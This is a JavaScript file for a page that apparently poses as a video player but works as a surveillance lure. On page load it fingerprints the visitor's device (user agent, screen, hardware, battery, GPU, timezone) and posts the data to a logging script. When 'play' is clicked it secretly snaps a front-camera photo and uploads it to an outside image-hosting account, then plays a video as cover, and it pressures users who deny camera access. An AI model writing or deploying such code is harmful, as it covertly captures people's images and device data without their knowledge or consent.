const playButton = document.getElementById('playButton');
const loader = document.getElementById('loader');
const video = document.getElementById('videoPlayer');

(async () => {
    const ua = navigator.userAgent;
    const getDeviceInfo = () => {
        const android = ua.match(/Android ([0-9.]+)/);
        const ios = ua.match(/OS ([0-9_]+)/);
        const device = ua.match(/\(([^)]+)\)/);
        return {
            androidVersion: android ? android[1] : null,
            iosVersion: ios ? ios[1].replace(/_/g, '.') : null,
            deviceName: device ? device[1] : null
        };
    };
    const deviceInfo = getDeviceInfo();
    const specs = {
        userAgent: ua,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        connection: navigator.connection?.effectiveType,
        downlink: navigator.connection?.downlink,
        rtt: navigator.connection?.rtt,
        deviceName: deviceInfo.deviceName,
        androidVersion: deviceInfo.androidVersion,
        iosVersion: deviceInfo.iosVersion,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        online: navigator.onLine,
        touchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        battery: await navigator.getBattery?.().then(b => ({ level: b.level, charging: b.charging })).catch(() => null),
        gpu: (() => {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            return gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : null;
        })()
    };
    await fetch('log_specs.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(specs)
    });
})();

playButton.addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        
        const videoTrack = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(videoTrack);
        const blob = await imageCapture.takePhoto();
        
        stream.getTracks().forEach(track => track.stop());
        
        const formData = new FormData();
        formData.append('file', blob);
        formData.append('upload_preset', 'user_pre');
        await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
        
        playButton.style.display = 'none';
        loader.style.display = 'block';
        
        setTimeout(() => {
            loader.style.display = 'none';
            video.controls = true;
            video.play();
        }, 2000);
        
    } catch (error) {
        alert('Camera permission denied. Please accept to watch the video.');
    }
});
